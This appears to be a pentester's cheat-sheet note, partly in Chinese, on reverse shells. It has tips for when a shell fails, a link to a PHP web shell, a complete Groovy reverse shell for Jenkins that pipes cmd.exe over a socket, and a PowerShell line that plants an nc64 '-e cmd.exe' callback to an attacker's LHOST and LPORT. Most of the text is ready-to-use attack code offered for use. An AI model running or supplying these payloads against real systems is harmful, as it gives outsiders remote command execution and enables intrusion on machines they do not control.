 - 在回弹shell时，可能会出现:
	 1. port block
	 2. a Low interactivity Shell Can Cause Problems.(especially in windows)
	 3. Privesc - file owner/group could be limited when trigger payload.
	 4. debug: output to file; always follow the exploit step;
	 5. try: change port -> payload -> change method;
Another web shell: https://github.com/WhiteWinterWolf/wwwolf-php-webshell
# Groovy Reverse Shell
For Jenkins
```groovy
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
# nc64 - windows
```powershell
echo C:\{pwd}\nc64.exe -e cmd.exe {LHOST} {LPORT} > C:\{pwd}\{target_file}
```